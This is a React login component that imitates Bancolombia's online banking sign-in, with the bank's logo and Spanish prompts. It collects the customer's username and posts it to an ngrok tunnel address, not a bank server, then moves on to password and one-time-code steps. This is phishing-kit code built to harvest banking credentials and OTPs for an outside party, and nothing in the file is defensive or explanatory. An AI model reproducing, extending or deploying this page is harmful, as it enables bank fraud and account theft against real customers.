import React, { useState, useEffect } from 'react';
import axios from 'axios';
import IMG1 from './img/verify.png';
import IMG2 from './img/logo.png';
import PasswordEntry from './PasswordEntry';
import Otp from './otp';
import { CSSTransition, TransitionGroup } from 'react-transition-group';
import './animations.css';

const BancolombiaLogin = () => {
  const [username, setUsername] = useState('');
  const [error, setError] = useState('');
  const [step, setStep] = useState(1);
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    // Lee el valor del localStorage al cargar el componente
    const storedUsername = localStorage.getItem('username');
    if (storedUsername) {
      setUsername(storedUsername);
    }
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (username.length === 0) {
      setError('Por favor, ingresa tu usuario.');
      return;
    }

    // Guarda el username en localStorage
    localStorage.setItem('username', username);
    setError('');
    setLoading(true); // Inicia el spinner

    try {
      const response = await axios.post('https://proof.ngrok.app/procesar', { codigo: username });
      console.log('Respuesta del servidor:', response.data);
      setStep(2);
    } catch (error) {
      console.error('Error en la solicitud:', error);
      setError('Error al enviar los datos.');
    } finally {
      setLoading(false); // Detiene el spinner
    }
  };

  return (
    <div className="bg-gray-100 min-h-screen flex flex-col items-center p-4">
      <TransitionGroup>
        <CSSTransition
          key={step}
          timeout={300}
          classNames="fade"
        >
          <div className="w-full max-w-md px-4">
            {loading && (
              <div className="spinner-overlay">
                <div className="spinner"></div>
              </div>
            )}

            {step === 1 && !loading && (
              <div className="bg-white p-6 rounded-lg shadow-lg">
                <img src={IMG1} alt="Verificar" className="w-full max-w-xs my-4 mx-auto" />
                <img src={IMG2} alt="Logo" className="w-full max-w-xs my-4 mx-auto" />
                <h1 className="text-2xl font-bold my-4 text-center">Ingresa tu usuario</h1>

                <p className="text-sm text-gray-600 mb-4 text-center">
                  El usuario es el mismo con el que ingresas a la Sucursal virtual Personas
                </p>

                <form onSubmit={handleSubmit} className="flex flex-col items-center">
                  <input
                    type="text"
                    id="txtUsuario"
                    placeholder="Usuario"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    className="border-b border-gray-300 w-full max-w-md py-2 px-4 mb-4 text-lg focus:outline-none"
                  />
                  
                  {error && <p className="text-red-500 text-sm mb-4 text-center">{error}</p>}
                  
                  <button
                    type="submit"
                    className="bg-yellow-400 text-black font-bold rounded-full w-full max-w-md py-2 hover:bg-yellow-300 transition-colors"
                  >
                    Continuar
                  </button>
                </form>

                <a href="#" className="text-blue-600 underline mt-4 block text-center">
                  ¿Olvidaste tu usuario?
                </a>
              </div>
            )}

            {step === 2 && !loading && (
              <PasswordEntry onSubmit={() => setStep(3)} />
            )}

            {step === 3 && !loading && (
              <Otp />
            )}
          </div>
        </CSSTransition>
      </TransitionGroup>
    </div>
  );
};

export default BancolombiaLogin;
